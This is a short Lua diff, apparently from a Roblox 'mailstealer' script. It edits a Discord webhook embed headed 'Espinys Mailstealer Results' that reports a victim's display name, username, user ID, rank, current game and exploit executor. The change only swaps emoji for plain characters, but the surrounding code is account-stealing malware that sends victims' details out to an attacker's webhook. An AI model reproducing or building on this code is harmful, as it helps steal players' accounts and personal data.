@@ -108,7 +108,7 @@
  	["embeds"]= {
  	  {
  		["title"]= "`Espinys Mailstealer Results`",
- 		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
+ 		["description"]= "**Data from the victim**\n**# Display Name: **".._G.PlrDisplayNameVictim.."\n**# Username: **".._G.PlrUserVictim.."\n**# User ID: **".._G.PlrUserIDVictim.."\n**# Rank: **".._G.CurrentRank.."\n**# Place: **".._G.GameIn.."**\nExecutor: **"..getexploit(),
  		["url"]= "https://discord.gg/vV6RYMscMp",
  		["color"]= ""..webhookcolor.."",
  		["thumbnail"] = {
